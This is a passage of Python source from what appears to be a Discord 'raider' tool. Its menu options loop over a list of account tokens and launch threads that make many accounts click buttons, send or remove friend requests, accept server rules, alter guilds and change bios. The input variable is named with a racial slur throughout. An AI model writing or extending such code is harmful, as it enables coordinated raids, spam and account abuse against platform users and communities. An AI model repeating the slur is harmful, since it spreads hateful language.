        messagelink = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Message Link {g}» {c}"))
        if messagelink == "": main()
        btnid = input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Button ID {g}» {c}")
        if btnid == "": main()
        delay = float(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Delay {g}» {c}"))
        if delay == "": main()
        raider = Raider()
        for token in tokens:
            threading.Thread(target=raider.button_clicker, args=(token, messagelink, btnid)).start()
            time.sleep(delay)
        exit = input(""); exit = main();

    elif nigger == "17":
        os.system('cls'); print(banner)
        delay = float(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Delay {g}» {c}"))
        if delay == "": main()
        type1 = input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Type (add/del) {g}» {c}")
        if type1 == "": main()
        elif type1 == "add":
            nickname = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Nickname {g}» {c}"))
            if nickname == "": main()
            raider = Raider()
            for token in tokens:
                threading.Thread(target=raider.friender, args=(token, nickname, type1)).start()
                time.sleep(delay)
            exit = input(""); exit = main();
        elif type1 == "rem":
            raider = Raider()
            userid = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}User ID {g}» {c}"))
            if userid == "": main()
            for token in tokens:
                threading.Thread(target=raider.friender, args=(token, userid, type1)).start()
                time.sleep(delay)
            exit = input(""); exit = main();
    elif nigger == "18":
        os.system('cls'); print(banner)
        server = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Guild ID {g}» {c}"))
        if server == "": main()
        raider = Raider()
        for token in tokens:
            threading.Thread(target=raider.acceptrules, args=(token, server)).start()
        exit = input(""); exit = main();
    elif nigger == "19":
        os.system('cls'); print(banner)
        server = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Guild ID {g}» {c}"))
        if server == "": main()
        raider = Raider()
        for token in tokens:
            threading.Thread(target=raider.guildcustomization, args=(token, server)).start()
        exit = input(""); exit = main();
    elif nigger == "20":
        os.system('cls'); print(banner)
        print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}INFO {g}»  {r}Sorry, we don't publish this option now.")
        print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}INFO {g}»  {r}You need to wait, for fully {c}release{r}")
        exit = input(""); exit = main();
    elif nigger == "21":
        os.system('cls'); print(banner)
        newbio = str(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Text {g}» {c}"))
        if newbio == "": main()
        delay = float(input(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {r}Delay {g}» {c}"))
        if delay == "": main()
        raider = Raider()
        for token in tokens:
            threading.Thread(target=raider.biochanger, args=(token, newbio)).start()
            time.sleep(delay)
        exit = input(""); exit = main();

main()